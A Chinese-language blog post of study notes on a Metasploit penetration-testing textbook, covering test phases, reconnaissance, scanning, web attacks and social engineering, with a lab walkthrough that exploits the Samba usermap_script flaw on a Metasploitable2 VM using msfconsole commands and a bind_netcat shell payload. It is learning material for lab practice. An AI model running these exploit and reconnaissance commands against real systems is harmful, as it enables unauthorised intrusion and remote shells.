Analysis</td><td>寻找漏洞攻击点，进行漏洞的挖掘</td></tr><tr><td>5</td><td>渗透攻击阶段</td><td>Exploitation</td><td>实施渗透攻击获取目标控制权</td></tr><tr><td>6</td><td>后渗透攻击阶段</td><td>Post Exploitation</td><td>总结攻击途径</td></tr><tr><td>7</td><td>报告阶段</td><td>Reporting</td><td>撰写报告，将完整的渗透过程进行总结，并提出补救方案</td></tr></tbody></table><blockquote><p>渗透阶段一般包含7个阶段，由主要核心的5部渗透和开头的服务交互再加上最后的报告。</p></blockquote><p><b>安全漏洞生命周期：</b></p><blockquote><p>A BUG's Life</p></blockquote><p>渗透测试的目的：找出系统中存在的安全漏洞，并实施渗透攻击。<br>安全系统漏洞(Vulnerability)：指信息系统中存在的缺陷或不适当的配置。<br>渗透代码(Exploit)：利用安全漏洞来造成入侵或是破坏效果的程序。<br>安全漏洞的生命周期：<br>1&gt; 安全漏洞研究与挖掘:包括代码审计，逆向工程，Fuzz测试。<br>2&gt; 渗透代码开发与测试:开发验证概念性的代码(POC)，来进行漏洞的验证<br>3&gt; 安全漏洞和渗透代码在封闭团队中流传<br>4&gt; 安全漏洞和渗透代码开始扩散<br>5&gt; 恶意程序出现并传播<br>6&gt; 渗透代码/恶意程序大规模传播并危害互联网<br>7&gt; 渗透攻击代码/攻击工具/恶意程序消亡</p><p>在上述2-5的流程中出现的漏洞一般被称为“0day”<br>恶意程序传播后称作“1day”</p><blockquote><p>要记得什么是0day等...不然根本同不懂大佬门在说什么</p></blockquote><p><b>漏洞披露方式：</b><br>1&gt; 完全公开披露<br>2&gt; 负责人的公开披露<br>3&gt; 进入底下经济产业链<br>4&gt; 小范围利用直至被动披露</p><p><b>漏洞资源库：</b></p><table><thead><tr><th>名称</th><th>地址</th></tr></thead><tbody><tr><td>cnnvd</td><td><a href="http://www.cnnvd.org.cn">www.cnnvd.org.cn</a></td></tr><tr><td>乌云漏洞库</td><td><a href="http://www.wooyun.org">www.wooyun.org</a></td></tr><tr><td>metasploit</td><td><a href="http://www.metasploit.com/modules">www.metasploit.com/modules</a></td></tr><tr><td>Exploit-db</td><td><a href="http://www.exploit-db.com">www.exploit-db.com</a></td></tr><tr><td>PacketStorm</td><td><a href="http://packetstormsecurity.org">packetstormsecurity.org</a></td></tr><tr><td>SecurityFocus</td><td><a href="http://www.securityfocus.com/bi">www.securityfocus.com/bi</a></td></tr><tr><td>SecurityReason</td><td><a href="http://securityreson.com/exploit_alert/">securityreson.com/exploit_alert/</a></td></tr><tr><td>SecurityVulns</td><td><a href="http://securityvylns.com/exploits/">securityvylns.com/exploits/</a></td></tr><tr><td>1337days</td><td><a href="http://1337day.com">1337day.com</a></td></tr></tbody></table><p><b>Metasploit 历史简介：</b></p><p>初级阶段：HD Moore 在 2003 年成立<br>2003年10月，发布了第一个基于Perl的Metaslpoit版本V1.0，仅有11个渗透攻击模块。<br>2004年4月，发布了MetaslpoitV2.0，此时已经包含18个渗透攻击模块和27个攻击载荷模块。<br>2004年8月，在BlackHat大会上发布了MetaslpoitV2.2，进入了飞速发展的时代。<br>2007年5月，进行了长达18个月的代码移植，发布了MetaslpoitV3.0版本，支持177个渗透模块，104个攻击模块以及30个辅助模块。<br>2009年，MetaslpoitV3.3已经发展到796个模块，41.9万行代码。<br>2009年，Metaslpoit被Rapid7收购，之后推出express以及pro版本。<br>2011年8月,MetaslpoitV4.0发布，引入了后渗透模块。</p><p><b>Metasploit框架：</b><br>Metasploit主要由五部分组成。</p><p>1&gt; 基础文件库:位于源码根目录下libraries目录下，有三个部分：rex、framework-core、framework-base。<br>rex：框架的基础组件，如：网络包装套接字、日志系统、PostgreSQL支持等<br>framework-core：负责与上层的模块插件的交互接口<br>framework-base：扩展framework-core，用于调用自身模块和集成模块</p><blockquote><p>我做测试时候使用的是kali自带的metasploit，并没有发现这三个部分的文件，其主目录位于/usr/share/metasploit-frame下。</p></blockquote><p>2&gt; 模块：由Metasploit框架所搭载实行渗透测试功能的部分。主要有6个部分：辅助模块Aux、攻击模块Exploits、后渗透攻击模块Post、攻击载荷模块Payloads、空指令模块Nops、编码器模块Encoders。</p><blockquote><p>模块部分是Metasploit的核心，这六部分模块不在这里做介绍，在后面每部分的使用的时候进行详细的表述。</p></blockquote><p>3&gt; 插件：Metasploit支持外部插件来扩展功能，如Nessus、OpenVas漏洞扫描器插件。<br>4&gt; 接口：Metasploit提供多种外部用户接口，如控制台：msfconsole、命令行：msfcli、图形化界面：msfgui等。</p><blockquote><p>做本章作业的时候发现，msfcli不能使用。bash不存在这个命令。查了一下结果发现msfcli早就已经废弃了...用msfconsole取代。有点坑...<br><a href="https://blog.rapid7.com/2015/07/10/msfcli-is-no-longer-available-in-metasploit/">原文链接</a></p></blockquote><p>5&gt; 功能程序：除了上述的四部分，Metasploit还提供一系列可执行程序，可以封装攻击荷载、多种类型的解码等。</p><p><b>第一章作业</b><br>1&gt; <font color = "Brown">通过搜索引擎、安全信息漏洞库搜索Samba服务usermap_script安全漏洞的相关信息。绘出生命周期图，标注重要时间点。</font></p><blockquote><p>度娘一下，这个漏洞应该是一个非常老旧的漏洞了...我jio着。<br>结果，哇，全是大佬们整理好的...orz...<br>揣摩一遍，还是进到CNNVD来自己看一遍吧...不然这个作业抄上了一点意义都没有了...</p></blockquote><blockquote><p>漏洞名称：Samba用户名映射脚本命令执行<br>漏洞编号：CVE-2007-2447(居然是07年的，这么近...啊也不近了，都2019了...)<br>存在版本：Samba 3.0.0 - Samba 3.0.25rc3<br>简单描述：MS-RPC功能允许远程攻击者在启用“用户名映射脚本”smb.conf选项时，通过涉及SamrChangePassword函数的shell元字符执行任意命令，并允许远程认证用户通过shell元字符执行命令<br><a href="https://blog.dvkunion.cn/img/k1uVpD.md.png"><img src="https://blog.dvkunion.cn/img/k1uVpD.md.png" alt="k1uVpD.md.png"></a></p></blockquote><p>2&gt; <font color = "Brown">更新Metasploit，找出攻击模块具体位置，查看一下针对不同系统的攻击模块数量。</font></p><blockquote><p>我所使用的Metaspoit版本为：metasploit v5.0.1-dev<br>总模块数量：aux：1046；exp:1851；post:321；payloads:541:encoders：44；nops:10<br>渗透攻击模块的位置位于：/usr/share/metasploit-framework/modules/<br>进入到exploits，可以发现几个明显的由操作系统命名的文件夹，Shell统计一下：</p></blockquote><p><code># ls -lR | grep &quot;^d&quot; | wc -l</code></p><blockquote><p>关于windows的攻击模块一共有47个。</p></blockquote><p>3&gt; <font color = "Brown">分别在Win和Linux下安装Metaspoit，运行并获取Linux靶机usermap_script漏洞渗透攻击，尝试植入VNC图形化远程控制工具的攻击荷载，成功获得Linux靶机上的远程控制桌面。</font></p><blockquote><p>我的win下一直都没有装Metasploit...因为...懒癌...<br>就使用kali下的做一下简单的尝试吧。kali-ip:10.10.10.128<br>靶机为Metasploitable2-ip:10.10.10.254<br>虚拟机内的连接为NAT模式。<br>首先进入msfconsole，使用samba_script模块</p></blockquote><blockquote><p><code>msf5 &gt; use multi/samba/usermap_script</code></p></blockquote><blockquote><p>使用show payloads查看攻击载荷，选定bind_netcat</p></blockquote><blockquote><p><code>msf5 exploit(multi/samba/usermap_script) &gt; set payload cmd/unix/bind_netcat</code></p></blockquote><blockquote><p>使用show options 查看需要设置的参数<br>将IP设置为靶机</p></blockquote><blockquote><p><code>msf5 exploit(multi/samba/usermap_script) &gt; set RHOSTS 10.10.10.254</code></p></blockquote><blockquote><p>exploit!</p></blockquote><blockquote><p>可以看到msf反馈已经成功，等待输出bash命令<br><a href="https://blog.dvkunion.cn/img/k1KjsJ"><img src="https://blog.dvkunion.cn/img/k1KjsJ.md.png" alt="k1KjsJ.md.png"></a></p></blockquote><p>4&gt; <font color = "Brown">使用msfcli命令行接口写一个SHELL脚本，实现用户只需要输入目标Linux靶机IP就可以使用usermap_script漏洞渗透攻击模块获取远程靶机的shell访问。</font></p><blockquote><p>上面说了msfcli已经被弃用，尝试用上文博客的方法写一个脚本<br>shell的写法还不是很熟练...代码只是简单粗暴的实现了所需功能...运行下过如下<br><a href="https://blog.dvkunion.cn/img/k1M8yQ"><img src="https://blog.dvkunion.cn/img/k1M8yQ.md.png" alt="k1M8yQ.md.png"></a><br>贴上代码<br><a href="https://blog.dvkunion.cn/img/k1MGLj.md.png"><img src="https://blog.dvkunion.cn/img/k1MGLj.md.png" alt="k1MGLj.md.png"></a></p></blockquote><h2 id="b-第二章-b"><b>第二章</b></h2><p>这一章主要搭建后面实现所需要的的网络拓扑环境</p><p><b>第二章小结：</b></p><blockquote><p>1.虚拟机内NAT和网桥的区别?<br>2.怎么配置IP?</p></blockquote><p>这本书需要的镜像总共为5个，统一安装在vm内。</p><table><thead><tr><th>名称</th><th>类型</th><th>模拟功能</th><th>基础操作系统</th><th>域名</th><th>IP</th></tr></thead><tbody><tr><td>Kali(原书使用BackTrack 5)</td><td>Linux攻击机</td><td>初始攻击点主机</td><td>Ubuntu</td><td><a href="http://attacker.dvssc.com">attacker.dvssc.com</a></td><td>10.10.10.128</td></tr><tr><td>OWASP BWA v0.94</td><td>Web服务靶机</td><td>门户网站服务器</td><td>Ubuntu</td><td><a href="http://www.dvssc.com">www.dvssc.com</a></td><td>10.10.10.129</td></tr><tr><td>Win2K3 Metasploitable</td><td>Windows靶机</td><td>后台服务器</td><td>Win2K3 En</td><td><a href="http://service.dvssc.com">service.dvssc.com</a></td><td>10.10.10.130</td></tr><tr><td>Linux Metasploitable</td><td>Linux 靶机</td><td>网关服务器</td><td>Ubuntu 8.04</td><td><a href="http://gate.dvssc.com">gate.dvssc.com</a></td><td>10.10.10.254(外)/192.168.10.254(内)</td></tr><tr><td>WinXP Metasploitable</td><td>Windows 靶机</td><td>内网客户端主机</td><td>WinXP En</td><td><a href="http://intranet1.dvssc.com">intranet1.dvssc.com</a></td><td>192.168.10.128</td></tr></tbody></table><p>各个镜像的配置和虚拟机的设置书上已经写得非常详细了，设置好VMnet1和VMnet8两张网卡的网段，再修改每一台主机的IP地址、Host模拟:修改靶机Host将域名和IP相对应。最终检测每一台虚拟机的互相连通性即可。</p><p>网关机192.168.10.254要打开路由转发功能net.ipv4.ip_forward,同时防火墙iptables的设置要正确。</p><p><b>第二章作业</b><br>1&gt; <font color = "Brown"> 搭建本章环境，测试连通性</font></p><blockquote><p>这个环境的搭建算是对基础的一个考验，如果网络基础非常好的话修改配置应该会应心得手，很快完成第二章的内容；其次也是对排错能力的一个考验，在实验过程中，由于我的攻击主机使用的kali，在配置网络时候没有注意到CIRD子网掩码二进制的不相同导致网络一直不相同等等问题。<br>总而言之，在这一章主要为后面的实验搭建好良好的环境：工欲善其事，必先利其器。</p></blockquote><p>2&gt; <font color = "Brown"> Vmware虚拟机的构建 </font></p><blockquote><p>这个目前还没有办法做到，等遇到了合适的渗透镜像时候会不断的加进来</p></blockquote><h2 id="b-第三章-b"><b>第三章</b></h2><p>在第三章主要讲了渗透测试的第一个步骤：信息搜集。</p><p><b>第三章小结：</b></p><blockquote><p>1.什么是外围信息收集?<br>2.什么是网络扫描?<br>3.常见的网络扫描有哪些?<br>4.Metasploit有哪些模块适用于信息侦查中?<br>5.Metasploit如何共享信息侦查的数据/成果?</p></blockquote><p>侦查：<br>目标：渗透测试目标的范围，发现渗透目标的安全漏洞与脆弱点，为后续的渗透攻击提供基础。<br>侦查包含：外围信息搜集/公开渠道信息搜集、网络扫描等。</p><h3 id="font-color-LightSkyBlue-3-1-外围信息收集-font-br"><font color = "LightSkyBlue">3.1 外围信息收集</font><br></h3><p><b>通过DNS和IP的侦查挖掘</b></p><p>1&gt; whois域名注册查询<br>msf内置：whois命令<br><a href="http://whois.chinaz.com">站长之家</a><br>2&gt; nslookup/dig 域名查询<br>nslookup:set type=A[MX(Mail Exchange)]<br>ls -d <a href="http://xxxxx.com">xxxxx.com</a><br>dig @&lt;dns服务器&gt; &lt;域名&gt;<br>3&gt; <a href="https://www.maxmind.com">IP2Location地址查询</a><br>4&gt; <a href="http://searchdns.netcraft.com">netcraft信息查询</a><br>http:toolbar.netcraft.com/site_report?url=<a href="http://www.testfire.net">http://www.testfire.net</a><br>5&gt; <a href="http://site.ip138.com/">IP2反查域名</a><br>6&gt; <a href="http://www.7c.com/">站长工具</a></p><blockquote><p>由于这本书出版的年代已经有些久远，所提供的一些工具网址不能够很好地进行运作。能达到同一目的的工具有很多，所以主要是需要了解每一个查询所能获取到哪些有用的信息。<br>whois查询：通过43端口建立tcp连接向服务器进行传送查询请求。这个功能可以查到域名下的DNS服务器、域名备案联系人、联系人邮箱、注册商地址、域名有效时间、注册时间、域名状态等等。同样通过whois反查，可以通过这一个域名所查处的邮箱、联系人、电话等等查到注册该域名的所有者所拥有的其他域名。<br>nslookup&amp;dig：这两个工具在使用的时候没有感觉出多么强大...因为我只看到了对于域名的IP解析...那直接ping一下不就好了么...orz....仔细查了一下，这两个工具更多的适用于dns服务器的查询与测试的...<br>IP2Location：这个就很显而易见了，拿到了域名IP通过IP定位一下服务器所在位置。<br>netcraft：用于子域名查询，在当前的二级域名上可以查询到多少个子域名。<br>IP2Domain：用于查询一台服务器上有多少个虚拟主机，即一个IP上绑定了多少个域名的解析。</p></blockquote><p><b>通过搜索引擎的信息搜集</b></p><p>1&gt; GoogleHacking技术<br>自动化工具：SiteDigger/Search Diggity<br><a href="http://www.mcafee.com/us/downloads/free-tools/sitedigger.aspx">SiteDigger</a><br><a href="http://www.stachliu.com">Search Diggity</a></p><blockquote><p>这两个自动化的工具原书的网址全凉了...去搜集一下这两个东西。<br>SiteDigger：安装完了...英文...应该是输入域名然后选择数据库？之后就进行搜索...<br>Search Diggity：原网址变更<a href="http://www.bishopfox.com/resources/tools/google-hacking-diggity/attack-tools/">Search Diggity New</a> 。 帮助手册都是英文...瞬间就不想看了。<br>还是放上GHDB吧:<a href="https://www.exploit-db.com/google-hacking-database">GHDB</a></p></blockquote><p>2&gt; 测试网站目录结构<br>google:parent directory site:<br>搜索inc配置文件/bak备份文件/txt或sql数据文件<br>Metasploit:brute_dirs/dir_listing/dir_scanner暴力</p><p><code>use auxiliary/scanner/http/dir_scanner</code><br><code>set THREAD 50</code><br><code>set RHOST xxxxxxxx.com</code><br><code>exploit</code></p><blockquote><p>对于google黑语法我在百度稍微的试了一下，总感觉度娘还是拦截掉了一些东西。没有Google用起来的感觉舒服。<br>对于Metasploit,简单的测试一下：应改和御剑这类工具是一样的，用字典来不断发送请求并对返回的状态码进行统计。只是不知道这个字典和御剑比起来那个更强一点。</p></blockquote><p>3&gt; 检索特定类型文件<br>google:site:xxxx.com file type:xls</p><p>4&gt; 搜索网站中的email地址:</p><p>Metasploit:search_email_collector模块</p><p><code>use auxiliary/gather/search_email_collector</code><br><code>set DOMAIN xxxxxxxx.com</code><br><code>run</code></p><p>5&gt; 搜索sql注入的页面<br>google:site:xxxx.com inurl:login</p><p><a href="http://www.cz88.net/">纯真数据库</a><br>traceroute</p><h3 id="font-color-LightSkyBlue-3-2-主机探测、端口扫描-font-br"><font color = "LightSkyBlue">3.2 主机探测、端口扫描</font><br></h3><p><b>主机探测：</b></p><p>对网段活跃主机的探测:<br>1.ping</p><p>2.Metasploit 模块<br>modules/auaxiliary/scanner/discovery:arp_sweep、ipv6_multicast、ipv6_neighbor、ipv6_neighbor_route_advertisement、udp_probe、udp_sweep<br>arp_sweep:arp确认网段中活跃主机<br>udp_sweep:udp确认网段中活跃主机并发现服务</p><p>3.Nmap<br>metasploit集成了nmap模块,使用方法不再赘述。</p><p><b>端口扫描：</b></p><p>在Metasploit中：serach postscan可以发现端口扫描工具<br>auxiliary/scanner/portscan/sys、ack、ftpbounce、tcp、xmas</p><p><b>服务扫描：</b></p><p>metasploit：_version/_login<br>e.g. ：http_version查找网络中web服务器。</p><p>也存在着例外：mssql_ping 检测 SQL-server服务(1433)</p><p>常见检测：telnet_version、ssh_version、tnslsnr_version(1521，oracle数据库)、open_proxy(开放代理检测)</p><h3 id="font-color-LightSkyBlue-3-3-口令猜测、嗅探-font-br"><font color = "LightSkyBlue">3.3 口令猜测、嗅探</font><br></h3><p><b>常用嗅探模块：</b></p><p>ssh_login、psnuffle</p><p>ssh_login：auxiliary/scanner/ssh/ssh_login</p><p>psnuffle：auxiliary/sniffer/psnuffle</p><h3 id="font-color-LightSkyBlue-3-4-漏洞扫描-font-br"><font color = "LightSkyBlue">3.4 漏洞扫描</font><br></h3><p>自动化扫描器：nessus、OpenVAS<br>针对性扫描器：nmap<br>这一小结的三个工具放到专门的工具博文下详细记录</p><p><b>OpenVAS</b></p><p>1).配置：<br>1&gt;生成运行所需要的证书文件<br><code># openvas-mkcert -q</code><br><code># openvas-mkcert-client -q</code><br>2&gt; 升级NVT库<br><code># openvas-nvt-sync</code><br>3&gt;初始化<br><code># openvassd</code><br><code># openvasmd --migrate</code><br><code># openvasmd --rebuild</code></p><p><b>Nessus</b></p><p><b>nmap</b></p><p>nmap集成了很多的漏洞扫描脚本，在Kali内的目录为：</p><h3 id="font-color-LightSkyBlue-3-5-信息整理与共享-font-br"><font color = "LightSkyBlue">3.5 信息整理与共享</font><br></h3><p>作为这一章结尾，信息整理与共享的确值得这个重量。良好的习惯和方法能够做到事半功倍的效果。</p><p>Metasploit支持使用数据库的形式导出与导入信息搜集的内容。db_nmap可以直接将nmap的扫描结果存储到数据库中；db_import支持数种格式的扫描结果的导入。</p><p>Metasploit数据库功能需要PostgreSQL的支持，Kali已经内置。</p><p>首先需要启动数据库</p><p><code># service postgresql start</code></p><p>第一次使用数据库时候，需要初始化：</p><p><code># msfdb init</code></p><p>在postgresql中会生成msf和msf_test两表</p><p>进入到msfconsole，输入下列命令查看数据库连接状态：</p><p><code>msf -&gt; db_status</code></p><p>如果初始化数据库这一步正常的话，这里可以直接看到数据库已经连接，连接的是默认的本地msf数据库。</p><p>想要连接其他数据库时，可以使用db_connect进行连接，语法为：</p><p>db_connect 用户名:密码@服务器地址:端口 / 数据库名</p><p><code>msf -&gt; db_connect postgres:password@localhost:7337 / msf</code></p><p>同理可知，db_disconnect 断开连接。</p><p>连接到数据库后，可以使用hosts命令查看数据库是否和已正常使用。</p><p><code>msf -&gt;hosts</code></p><p>一切正常后，我们就可以使用 db_nmap 等封装命令直接将扫描结果储存在数据库中。</p><p>同样也可以将nmap扫描输出的文件使用 db_import 进行查看</p><blockquote><p>笔记：db_import 还可以识别 Acunetix、Amap、Appscan、Burp Session、Microsoft Baseline Security Analyzer 、 Nessus 、 NetSparker、NeXpose 、OpenVAS report、Retina等。<br>基本不认识几个。。。等这个结束以后慢慢补上然后进行测试。</p></blockquote><p>小组共享数据有两种方式，一是通过连接同一个数据库，二是使用MSF RPC数据库。<br>第一种方法需要配置 postgresql 的配置，使其允许远程的数据库连接请求。<br>第二种需要小组其中的一台机器使用 mfsrpcd 命令进行创建，其他小组成员通过GUI进行连接。</p><blockquote><p>此处在未来工作后再进行详细补充</p></blockquote><p><b>第三章作业</b><br>1&gt; <font color = "Brown"> 对一个你感兴趣的个人网站进行DNS、IP与位置的信息查询，找出网络运营者的联系方式，宿主服务器与所在位置等信息。撰写一份简单的调查报告</font></p><p>2&gt; <font color = "Brown"> 利用搜索引擎或相关工具对 <a href="http://testfire.net">testfire.net</a> <a href="http://www.dvssc.com">www.dvssc.com</a> 网站进行更加细致的搜索与侦查，发现更多敏感信息泄露与web安全漏洞 </font></p><p>3&gt; <font color = "Brown"> 端口扫描练习：补全表3-1 </font></p><p>4&gt; <font color = "Brown"> 漏洞扫描练习：补全表3-3 </font></p><p>5&gt; <font color = "Brown"> 数据共享练习：将3、4的扫描结果存储在数据库内 </font></p><h2 id="b-第四章-b"><b>第四章</b></h2><p>从第四章开始，进入到渗透步骤的攻击阶段，</p><p>第四章主要讲解web方面的攻击。<br>个人感觉第四章是看的最云里雾里的一章...一是所讲工具有些已经不能使用，并且工具的使用讲的较为粗略；二是结构上有点不太适应...感觉没有前几章读起来逻辑性更好一些，实战部分只挑了DVWA的四个样例；webshell代码解析倒是很详细，但是看不懂啊orz...</p><p><b>第四章小结：</b></p><blockquote><p>1.web安全引起重视的原因?<br>2.OWASP 是什么组织?其每年发布的top 10 都有哪些?<br>3.提升:web开源工具了解?<br>4.提升:kali内web安全工具了解?<br>5.通过dvwa/owasp top10 ，对各种web漏洞的原理了解，尝试编写自己的攻击模块?</p></blockquote><p><b>DMZ区：</b><br>DMZ（Demilitarized Zone）即俗称的隔离区或非军事区，与军事区和信任区相对应，作用是把WEB，e-mail，等允许外部访问的服务器单独接在该区端口，使整个需要保护的内部网络接在信任区端口后，不允许任何访问，实现内外网分离，达到用户需求。</p><p><b>web攻击迅速发展的7大理由：</b><br>1.广泛性：web应用存在于广大网络中。<br>2.技术门槛低：Lamp、IIS+ASP、.NET等。<br>3.防火墙策略可绕<br>4.安全机制不够成熟：HTTP发展处于滞后阶段。<br>5.隐蔽性：难以取证。<br>6.变化性：由于业务和服务增加或修改，可能会因为调用不当导致出现验证漏洞。<br>7.利益性：web攻击的利益丰厚</p><p><b>OWASP TOP10:</b><br>1.SQL注入：手注、盲注<br>2.跨站脚本：XSS(Cross-Site Scripting) 分为存储型XSS、反射型XSS、DOM型XSS。<br>3.跨站伪造请求：CSRF(Cross-Site Request Forgery) 是XSS的一种衍生。<br>4.会话认证管理缺陷：BASM(Broken Authenitication and Session Managament) Cookie缺陷。<br>5.安全配置错误：常用服务设置错误。<br>6.不安全的密码存储：例如明文密码，算法key未处理或保护不当。<br>7.不安全的参考对象：读取任意文件或资料。<br>8.限制URL失败：如描述，限制失败。<br>9.缺乏传输层保护：网络传输过程中被监听。缺乏SSL/TLS等保护机制。<br>10.未验证的重定向和跳转</p><p><b>web扫描工具：</b></p><p>Metasploit:辅助模块：auxiliary；渗透模块：exploit。<br>第三方：W3AF、SQLmap、wXf、XSSF、BeEF<br>开源扫描器：W3AF、Arachni、Grabber、Wapiti(sql)、Zed Attack Proxy、Skipfish、Sandcat Free Edithin(xss)、Paros、burpsuite、WATOBO(FUZZ)。</p><p><b>W3AF：</b><br>W3AF(Web Application Attack and Audit Framework)是一个综合性的扫描器。其主要分为核心模块和插件模块。<br>核心模块用于进程调度和插件使用；插件分为八类：发现、审计、搜索、攻击、输出、修改、入侵、破解。<br>W3AF也包含两种工作模式：命令行、GUI<br>同样这里不对工具进行过多赘述。详见W3AF工具讲解。</p><blockquote><p>这个工具的安装搞了我一天的时间...为了这玩意还重装了一下虚拟机...这本书对这个工具的使用不是很多，希望在后面学习使用时物有所值吧...</p></blockquote><p><b>SQLmap：</b><br>SQLmap是一款基于Python2的命令行自动注入工具。Kali自带，这里提一下在Metasploit内使用SQLmap</p><blockquote><p>2022-02-23修正：当年读这本书的时候sqlmap还不支持py3。现在早就已经支持了.....</p></blockquote><p><code>msf -&gt; use auxiliary/scanner/http/sqlmap</code><br><code>msf (sqlmap) -&gt; show options</code></p><p><b>其他：</b><br>对于书中所讲解的其他几个工具：如wXf(费了好大的力气找到的资源...)、xssf(这个更坑，据说已经停止更新和维护了，对metasploit兼容性越来越差)...由于略微的有一点年代感，在本章练习dvwa和owasp top10 中会学习近些时间比较新的或者更加实用的工具来进行代替。</p><p><b>第四章作业</b><br>1&gt; <font color = "Brown"><a href="http://xn--www-855fm2v.testfire.net">查找www.testfire.net</a> 中存在的sql注入,应用sqlmap等工具或是手动注入</font></p><p>2&gt; <font color = "Brown">添加xssf模块，完成一次存储型跨站&quot;钓鱼&quot;</font></p><p>3&gt; <font color = "Brown">通过wXf扫描wordpress和joomla两个模块进行RFI攻击</font></p><p>4&gt; <font color = "Brown">从exploit-db上找一个wordpress漏洞搭建一个漏洞环境，通过metasploit进行攻击</font></p><p>5&gt; <font color = "Brown">在DVWA中实践并理解安全配置及漏洞原理</font></p><p>6&gt; <font color = "Brown">尝试使用sqlmap进行shell注入</font></p><p>7&gt; <font color = "Brown">尝试向metasploit中加入网上的web渗透模块并搭建测试环境进行测试</font></p><h2 id="b-第五章-b"><b>第五章</b></h2><p>第五章讲述网络服务的渗透攻击，重点在于对所给实例的漏洞的分析过程的学习，这里和第六章先放一下，涉及了很多的汇编和二进制问题。<br>其主要介绍漏洞有：MS08-067、CVE-2009-1979、OSVDB-59110、</p><p>开始依旧是扫盲。</p><p><b>内存攻击：</b><br>攻击者利用软件安全漏洞构造恶意输入导致软件处理数据产生非预期错误，将数据写入特定的敏感位置从而劫持软件控制流量，执行外部代码。</p><p><b>缓冲区溢出漏洞：</b><br>缓冲区溢出（buffer overflow），是针对程序设计缺陷，向程序输入缓冲区写入使之溢出的内容（通常是超过缓冲区能保存的最大数据量的数据），从而破坏程序运行、趁著中断之际并获取程序乃至系统的控制权。<br>根据溢出内存位置不同，缓冲区溢出分为栈溢出和堆溢出。</p><p><b>栈溢出：</b><br>栈溢出指当写入数据超过内存分配给栈的缓冲区空间。会导致覆盖缓冲区附近的变量从而改变程序流程和结果；或是覆盖保存的函数地址修改为指定的地址；还有可能覆盖掉某个指针或者程序异常处理结构。<br>覆盖返回地址的利用方式是在函数进行调用时覆盖掉函数返回指针所指向的地址，从而达到调用shellcode的目的；<br>覆盖异常处理的利用方式</p><h2 id="b-第六章-b"><b>第六章</b></h2><p>第六章讲述的是客户端的渗透攻击。包含了常用的客户端软件如：浏览器、office、Adobe等。<br>主要的漏洞有：MS11-050、MS10-087。</p><p>同第五章，这一部分在开始学习逆向之后补齐。</p><h2 id="b-第七章-b"><b>第七章</b></h2><p>第七章讲社工，这一部分还是蛮有意思的。<br>说到社工，就不得不提凯文.米特尼克...和《欺骗的艺术》(虽然到现在我还没有看过，近期补上)。还有一本人性的弱点。</p><p>讲道理社工是一门博大精深的学问，个人觉得可以通过一些逻辑小游戏或者海龟汤故事之类的锻炼叙述一个故事或情景模拟。</p><p>从原理上来说，社会工程学（Social Engineering），是一种通过人际交流的方式获得信息的非技术渗透手段。他利用对象的心理弱点、人类的本能反应和好奇心等心理特征，进行欺骗、冒充、引诱等多种手段达成目的。</p><p>社工最重要的还是在进行之前的信息搜集。你能取得越多的信息，对于你获取信任的可能性就越大。</p><p>书中描述了一个社会工程学的环节框架：</p><p>1.信息搜集<br>2.诱导<br>3.托词<br>4.心理影响</p><p>在PC端对社工能够起到帮助的有：网络电话、木马、钓鱼网站的伪造、U盘攻击等等。</p><p><b>网络电话</b></p><p><b>木马</b><br>msfpayload</p><p><b>钓鱼</b><br>set工具</p><p><b>U盘攻击</b><br>autorun.inf<br>UItraISO<br>Hacksaw<br>Switchblade</p><h4 id="参考链接">参考链接</h4><blockquote><p>0.Metasploit渗透测试魔鬼训练营渗透.pdf : <a href="https://github.com/Urinx/Books/raw/master/metasploit/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%AD%94%E9%AC%BC%E8%AE%AD%E7%BB%83%E8%90%A5.pdf">https://github.com/Urinx/Books/raw/master/metasploit/Metasploit渗透测试魔鬼训练营.pdf</a><br>1.PTES : <a href="http://www.pentest-standard.org">http://www.pentest-standard.org</a><br>2.原文链接 : <a href="https://blog.rapid7.com/2015/07/10/msfcli-is-no-longer-available-in-metasploit/">https://blog.rapid7.com/2015/07/10/msfcli-is-no-longer-available-in-metasploit/</a><br>4.![k1KjsJ.md.png : <a href="https://blog.dvkunion.cn/img/k1KjsJ.md.png">https://blog.dvkunion.cn/img/k1KjsJ.md.png</a>]<br>5.![k1M8yQ.md.png : <a href="https://blog.dvkunion.cn/img/k1M8yQ.md.png">https://blog.dvkunion.cn/img/k1M8yQ.md.png</a>]<br>7.站长之家 : <a href="http://whois.chinaz.com">http://whois.chinaz.com</a><br>8.IP2Location地址查询 : <a href="https://www.maxmind.com">https://www.maxmind.com</a><br>9.netcraft信息查询 : <a href="http://searchdns.netcraft.com">http://searchdns.netcraft.com</a><br>10.IP2反查域名 : <a href="http://site.ip138.com/">http://site.ip138.com/</a><br>11.站长工具 : <a href="http://www.7c.com/">http://www.7c.com/</a><br>12.SiteDigger : <a href="http://www.mcafee.com/us/downloads/free-tools/sitedigger.aspx">http://www.mcafee.com/us/downloads/free-tools/sitedigger.aspx</a><br>13.Search Diggity : <a href="http://www.stachliu.com">http://www.stachliu.com</a><br>14.Search Diggity New : <a href="http://www.bishopfox.com/resources/tools/google-hacking-diggity/attack-tools/">http://www.bishopfox.com/resources/tools/google-hacking-diggity/attack-tools/</a><br>15.GHDB : <a href="https://www.exploit-db.com/google-hacking-database">https://www.exploit-db.com/google-hacking-database</a><br>16.纯真数据库 : <a href="http://www.cz88.net/">http://www.cz88.net/</a></p></blockquote>]]></content>
    
    
    <summary type="html">&lt;h1&gt;Metasploit渗透测试魔鬼训练营渗透笔记&lt;/h1&gt;
&lt;p&gt;&lt;i&gt;2019-1-30&lt;/i&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://github.com/Urinx/Books/raw/master/metasploit/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%AD%94%E9%AC%BC%E8%AE%AD%E7%BB%83%E8%90%A5.pdf&quot;&gt;Metasploit渗透测试魔鬼训练营渗透.pdf&lt;/a&gt;&lt;/p&gt;
&lt;!-- split --&gt;
&lt;p&gt;日常写点什么&lt;br&gt;
寒假开始一周多，想把这本搞了快半年的书彻底的读完。&lt;br&gt;
写一个小总结似的笔记，把书里的课后习题和镜像练习实验都一遍。&lt;br&gt;
也附带的写一下遇到的坑点和心得吧。&lt;br&gt;
调整了一下结构，把每一章的小结都放到了开始部分，希望以后复习时候可以一口气回答出这些问题。&lt;/p&gt;</summary>
    
    
    
    <category term="Reading" scheme="http://blog.dvkunion.cn/categories/Reading/"/>
    
    
    <category term="WEB" scheme="http://blog.dvkunion.cn/tags/WEB/"/>
    
    <category term="笔记" scheme="http://blog.dvkunion.cn/tags/%E7%AC%94%E8%AE%B0/"/>
    
